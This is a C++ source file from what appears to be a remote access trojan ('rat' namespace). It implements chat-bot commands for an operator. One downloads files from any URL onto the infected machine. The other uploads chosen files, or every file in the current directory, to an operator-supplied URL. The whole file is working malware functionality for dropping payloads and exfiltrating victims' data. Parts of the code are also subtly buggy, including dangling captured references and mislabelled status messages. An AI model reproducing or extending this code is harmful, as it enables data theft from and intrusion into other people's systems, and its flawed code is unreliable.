#include "rat/Handler.hpp"
#include "rat/handler/debug.hpp"
#include "rat/system.hpp"

#include <curl/curl.h>

namespace rat::handler {

void Handler::handleDownloadCommand() {
    HANDLER_DEBUG_LOG("Handling downloading command");
    if(this->command.parameters.empty()) {
        this->sendMessage("Usage: /download <url> [path]");
        return;
    }
    const auto &params = this->command.parameters;
    const size_t number_params = params.size();
    const std::string &url = params[0];
    this->short_process_pool->enqueue([this, &url, &params, &number_params]() {
        std::lock_guard<std::mutex> curl_client_lock(this->curl_client_mutex);
        std::lock_guard<std::mutex> backing_bot_lock(this->backing_bot_mutex);
        switch(number_params) {
        case 1: {
            if(this->curl_client->download(url).curl_code == CURLE_OK) {
                this->sendMessage("File was downloaded");
            } else {
                this->sendMessage("Download Failed");
            }

            this->curl_client_net_ops_counter++;
            break;
        }
        case 2: {
            const std::filesystem::path path(params[1]);

            if(std::filesystem::exists(path) && std::filesystem::is_directory(path)) {
                const auto file_path = path / rat::networking::_getFilePathFromUrl(url);

                if(this->curl_client->download(url, file_path).curl_code == CURLE_OK) {
                    this->sendMessage(
                        fmt::format("File was downloaded to path {}", file_path.string()));
                } else {
                    this->sendMessage("Download failed");
                }
            } else {
                if(std::filesystem::exists(path)) {
                    this->sendBackingMessage(
                        fmt::format("Warning: overwriting the file {}", path.string()));
                }

                if(this->curl_client->download(url, path).curl_code == CURLE_OK) {
                    this->sendBackingMessage(
                        fmt::format("The file was downloaded: {}", path.string()));
                } else {
                    this->sendBackingMessage(
                        fmt::format("This file failed to download {}", path.string()));
                }

                this->curl_client_net_ops_counter++;
            }
            break;
        }
        }
        std::this_thread::sleep_for(std::chrono::seconds(1));
    });
}

void Handler::handleUploadCommand() {
    if(this->command.parameters.size() < 2) {
        this->sendMessage("Usage: /upload <filepaths...> <url>");
        return;
    }

    const std::string &url = this->command.parameters[0];

    const std::vector<std::string> &paths = this->command.parameters;

    // Handle "*" meaning all files in current directory
    if(paths.size() - 1 == 1 && paths[1] == "*") {
        std::vector<std::filesystem::path> real_paths;

        for(const auto &entry :
            std::filesystem::directory_iterator(std::filesystem::current_path())) {
            if(std::filesystem::is_regular_file(entry.status())) {
                real_paths.push_back(entry.path());
            }
        }
        if(real_paths.empty()) {
            this->sendMessage("No files found in current directory.");
            return;
        }
        this->long_process_pool->enqueue([this, &real_paths, &url]() {
            std::unique_lock<std::mutex> curl_client_lock(this->curl_client_mutex);
            std::unique_lock<std::mutex> backing_bot_lock(this->backing_bot_mutex);

            for(const auto &file_path : real_paths) {
                if(this->curl_client->upload(file_path, url).curl_code == CURLE_OK) {
                    this->sendBackingMessage(
                        fmt::format("File {} downloaded ", file_path.string()));
                } else {
                    this->sendBackingMessage(
                        fmt::format("File {} failed to download", file_path.string()));
                }
            }
            this->curl_client_net_ops_counter++;
            std::this_thread::sleep_for(std::chrono::seconds(1));
        });
    } else {
        for(auto it = paths.begin() + 1; it != paths.end(); ++it) {
            std::filesystem::path file_path(std::move(*it));

            if(!std::filesystem::exists(file_path)) {
                this->sendBackingMessage(
                    fmt::format("File does not exist: {}", file_path.string()));
                continue;
            }
            if(std::filesystem::is_directory(file_path)) {
                this->sendBackingMessage(fmt::format("Skipping directory: {}", file_path.string()));
                continue;
            }
            this->long_process_pool->enqueue([this, &file_path, &url]() {
                std::unique_lock<std::mutex> curl_client_lock(this->curl_client_mutex);
                std::unique_lock<std::mutex> backing_bot_lock(this->backing_bot_mutex);

                if(this->curl_client->upload(file_path, url).curl_code == CURLE_OK) {
                    this->sendBackingMessage(
                        fmt::format("File {} uploaded to {}", file_path.string(), url));
                } else {
                    this->sendBackingMessage(
                        (fmt::format("File {} failed to upload to {}", file_path.string(), url)));
                }

                this->curl_client_net_ops_counter++;
                std::this_thread::sleep_for(std::chrono::milliseconds(500));
            });
        }
    }
    this->sendBackingMessage("Upload complete.");
}

} // namespace rat::handler

#undef HANDLER_DEBUG_LOG
#undef HANDLER_ERROR_LOG
#ifdef DEBUG_RAT_HANDLER
#undef DEBUG_RAT_HANDLER
#endif
